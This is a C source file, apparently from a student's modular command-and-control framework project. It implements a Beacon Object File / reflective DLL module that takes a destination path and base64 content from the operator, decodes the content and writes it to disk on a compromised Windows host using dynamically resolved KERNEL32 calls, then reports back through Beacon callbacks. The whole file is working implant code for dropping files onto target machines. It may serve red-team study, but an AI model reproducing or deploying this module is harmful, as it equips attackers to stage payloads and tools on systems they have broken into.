/*
 * ============================================================
 *  modules/bof/mod_upload.c — Écriture d'un fichier (BOF/RDLL)
 *
 *  Reçoit deux entrées BeaconData packées dans args :
 *    1. Chemin de destination (ex: C:\Users\target\file.txt)
 *    2. Contenu du fichier encodé en base64
 *
 *  Décode le base64 et écrit les bytes sur disque.
 *
 *  Format des args (pack_upload_args côté agent) :
 *    [4-byte LE = len_dest][dest_bytes]
 *    [4-byte LE = len_b64 ][b64_bytes ]
 *
 *  Compilation BOF :
 *    x86_64-w64-mingw32-gcc -c -DBOF_MODE -o upload.x64.o mod_upload.c
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "beacon.h"

/* ── Déclarations Windows API (BOF mode uniquement) ──────────
 * En RDLL mode, windows.h fournit déjà ces déclarations.     */
#ifndef RDLL_MODE

#define GENERIC_WRITE         0x40000000
#define CREATE_ALWAYS         2
#define FILE_ATTRIBUTE_NORMAL 0x80

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD,
    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD,
    LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);

#endif /* !RDLL_MODE */

#ifndef INVALID_HANDLE_VALUE
#  define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
#endif

/* ── Décodage base64 inline ─────────────────────────────────── */
static int b64v(unsigned char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static SIZE_T b64_decode(const char *in, int in_len,
                          unsigned char *out) {
    SIZE_T out_len = 0;
    for (int i = 0; i + 3 < in_len; i += 4) {
        int b0 = b64v((unsigned char)in[i]);
        int b1 = b64v((unsigned char)in[i+1]);
        int b2 = (in[i+2] != '=') ? b64v((unsigned char)in[i+2]) : -1;
        int b3 = (in[i+3] != '=') ? b64v((unsigned char)in[i+3]) : -1;
        if (b0 < 0 || b1 < 0) break;
        out[out_len++] = (unsigned char)((b0 << 2) | (b1 >> 4));
        if (b2 >= 0) out[out_len++] = (unsigned char)(((b1 & 15) << 4) | (b2 >> 2));
        if (b3 >= 0) out[out_len++] = (unsigned char)(((b2 &  3) << 6) |  b3);
    }
    return out_len;
}


/* ── Fonction d'entrée BOF ────────────────────────────────── */

void go(char *args, int args_len) {
    datap parser;
    int   dest_len = 0;
    int   b64_len  = 0;

    BeaconDataParse(&parser, args, args_len);
    char *dest_raw  = BeaconDataExtract(&parser, &dest_len);
    char *b64_data  = BeaconDataExtract(&parser, &b64_len);

    if (!dest_raw || dest_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Chemin destination manquant\n");
        return;
    }
    if (!b64_data || b64_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Données fichier manquantes\n");
        return;
    }

    /* Copier dest dans un buffer null-terminé.
     * BeaconDataExtract retourne un pointeur dans le buffer d'args ;
     * l'entrée suivante (b64_len) commence immédiatement après, donc
     * il n'y a PAS de null naturel — CreateFileA lirait hors-buffer. */
    char dest[1024] = {0};
    if (dest_len >= (int)sizeof(dest)) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Chemin trop long (%d)\n", dest_len);
        return;
    }
    __builtin_memcpy(dest, dest_raw, (SIZE_T)dest_len);
    /* dest[dest_len] = '\0'; déjà 0 grâce à = {0} */

    /* Allouer le buffer de décodage (~75 % de la taille base64) */
    SIZE_T buf_cap = (SIZE_T)((b64_len * 3 / 4) + 4);
    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *buf = (unsigned char *)KERNEL32$HeapAlloc(heap, 0, buf_cap);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[ERREUR] HeapAlloc %lu bytes échoué\n",
                     (unsigned long)buf_cap);
        return;
    }

    SIZE_T data_len = b64_decode(b64_data, b64_len, buf);

    /* Ouvrir (créer/écraser) le fichier destination */
    HANDLE hf = KERNEL32$CreateFileA(
        dest, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hf == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[ERREUR] Impossible de créer '%s'\n", dest);
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }

    /* Écrire par blocs de 1 MB (WriteFile limite à DWORD bytes par appel) */
    SIZE_T  written_total = 0;
    BOOL    ok = TRUE;
    const SIZE_T BLOCK = 1024 * 1024;

    while (written_total < data_len && ok) {
        DWORD to_write = (DWORD)((data_len - written_total > BLOCK)
                                 ? BLOCK : data_len - written_total);
        DWORD written  = 0;
        ok = KERNEL32$WriteFile(hf, buf + written_total, to_write, &written, NULL);
        written_total += written;
    }

    KERNEL32$CloseHandle(hf);
    KERNEL32$HeapFree(heap, 0, buf);

    if (ok && written_total == data_len) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[OK] Fichier écrit: %s (%lu bytes)\n",
                     dest, (unsigned long)data_len);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
                     "[ERREUR] Écriture incomplète: %lu/%lu bytes\n",
                     (unsigned long)written_total, (unsigned long)data_len);
    }
}
